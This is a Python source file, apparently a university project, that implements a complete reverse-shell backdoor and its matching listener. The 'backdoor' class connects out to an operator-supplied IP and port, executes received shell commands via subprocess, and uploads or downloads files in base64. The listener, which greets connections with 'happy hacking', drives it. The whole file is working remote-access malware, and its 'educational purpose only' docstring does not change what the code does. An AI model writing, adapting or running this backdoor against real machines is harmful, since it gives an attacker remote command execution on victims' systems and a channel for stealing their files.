import socket
import sys
import os
import subprocess
import json
import base64


"""this code is made by hisamdavid as unversity ptoject for educatinal perpose only"""

class Listner:
    def __init__(self,ip,port) :
        try:
            listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            listener.bind((ip,port))
            listener.listen(0)
            print("listner is online\n")
            self.connection,address=listener.accept()
            print(f"we are in,happy hacking :)\n ip:port >> {str(address)}\n")
        except Exception:
            print("some err aqured")

    def send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data.encode())

    def receive(self):
        json_data=b""
        while True:
            try:
                json_data+=self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self,command):
        if command[0]=="exit":
            self.send(command)
            self.connection.close()
            exit()
        self.send(command)
        return self.receive()

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
        return "downlod successful"

    def read_file(self,path):
        with open(path,"rb")as file:
            return base64.b64encode(file.read())
        
    def run(self):
        while True:
            command=input(">> ")
            command=command.split(" ")
            try:
                if command[0]=="upload":
                    file_content=self.read_file(command[1])
                    command.append(file_content.decode())
                elif command[0]=="cd" and len(command)>2:
                    command[1]=" ".join(command[1:])
                result=self.execute_remotely(command)
                if command[0]=="download" and "bad error :(" not in result:
                    result=self.write_file(command[1],result)
            except Exception:
                result="bad error :("
            print(result)





class backdoor:

    def __init__(self,ip,port) :
                self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                self.connection.connect((ip,port))


    def send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data.encode())

    def receive(self):
        json_data=b""
        while True:
            try:
                json_data+=self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    
    def CMDcommand(self,command):
        return subprocess.check_output(command,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)

    def change_cd(self,path):
        os.chdir(path)
        return path

    def read_file(self,path):
        with open(path,"rb")as file:
            return base64.b64encode(file.read())
        
    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
        return "upload successful"
    
    def run(self):
        while True:
            try:
                command=self.receive()
                if command[0]=="exit":
                        self.connection.close()
                        sys.exit()
                elif command[0]=="cd" and len(command)>1:
                        result=self.change_cd(command[1])
                elif command[0]=="download":
                        result=self.read_file(command[1]).decode()
                elif command[0]=="upload":
                        result=self.write_file(command[1],command[2])
                else:
                        result=self.CMDcommand(command).decode()
            except Exception:
                result="bad error :("
            self.send(result)








